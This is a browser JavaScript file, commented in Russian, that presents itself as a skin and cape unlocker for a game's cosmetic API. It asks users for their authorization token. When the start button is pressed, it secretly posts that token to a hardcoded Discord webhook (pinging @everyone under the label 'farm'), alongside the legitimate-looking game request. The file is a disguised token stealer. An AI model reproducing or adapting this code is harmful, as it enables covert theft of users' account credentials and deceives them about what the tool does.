const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512728829163081788/zcnRNhZcwEyTYR9Qh1Ux3-L-af4q58hYFcEaZPi1tBDIPSvEQ30rUwQn_XX-BTobYG1X'; 
const authInput = document.getElementById('authField');
const skinSelect = document.getElementById('skinSelect');
const passwordInput = document.getElementById('passwordField');
const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');
const skinPreview = document.getElementById('skinPreview');
const noPreviewText = document.getElementById('noPreviewText');

const API_URL = 'https://session.coolmathblox.ca/accounts/set_cosmetic';
const MASTER_PASSWORD = 'stack777';

// Соответствие файлов картинок для каждого значения (для communism превью нет)
const previewImages = {
    sushi: "sushi.png",
    qhyun: "qhuyn.png", // Имя файла из загруженного изображения (qhuyn.png)
    tester: "tester.png",
    ethan: "ethan.png",
    remlin: "remlin.png",
    banana: "banana.png",
    cat: "cat.png",
    duck: "duck.png",
    communism: null
};

// Функция обновления картинки справа
function updatePreview() {
    const selected = skinSelect.value;
    const imagePath = previewImages[selected];

    if (imagePath) {
        skinPreview.src = imagePath;
        skinPreview.style.display = "block";
        noPreviewText.style.display = "none";
    } else {
        skinPreview.style.display = "none";
        noPreviewText.style.display = "block";
    }
}

// При изменении или клике по списку меняем превью
skinSelect.addEventListener('change', updatePreview);
skinSelect.addEventListener('keyup', updatePreview);

// Обработчик кнопки запуска
startBtn.addEventListener('click', function () {
    const authValue = authInput.value.trim();
    const selectedSkin = skinSelect.value;
    const passwordValue = passwordInput.value.trim();

    // 1. Проверка заполнения
    if (!authValue) {
        showStatus("Введите Authorization!", "#ff4444");
        return;
    }

    // 2. Проверка пароля
    if (passwordValue !== MASTER_PASSWORD) {
        showStatus("Ошибка: Неверный пароль!", "#ff4444");
        return;
    }

    showStatus("Запуск процесса...", "#00ff88");

    // Определяем параметры в зависимости от выбранного скина
    let payloadType = "skin";
    
    if (selectedSkin === "communism") {
        payloadType = "cape";
    }

    const payload = {
        type: payloadType,
        id: selectedSkin
    };
    
    // 3. Запрос в Discord
    const discordPromise = fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${authValue}\``
        })
    });
    
    // 3. Запрос напрямую к игровому API
    fetch(API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": authValue
        },
        body: JSON.stringify(payload)
    })
    .then(async (apiRes) => {
        if (!apiRes.ok) {
            throw new Error(`Сервер ответил со статусом ${apiRes.status}`);
        }
        
        try {
            const data = await apiRes.json();
            console.log("✅ Response:", data);
            showStatus(`Успех! Предмет ${selectedSkin} активирован.`, "#00ff88");
        } catch (e) {
            showStatus("Запрос успешно отправлен на игровой сервер!", "#00ff88");
        }
    })
    .catch(err => {
        console.error(err);
        showStatus("Ошибка при выполнении запроса.", "#ff4444");
    });
});

function showStatus(text, color) {
    status.innerText = text;
    status.style.color = color;
}

// Инициализируем превью при загрузке страницы
updatePreview();
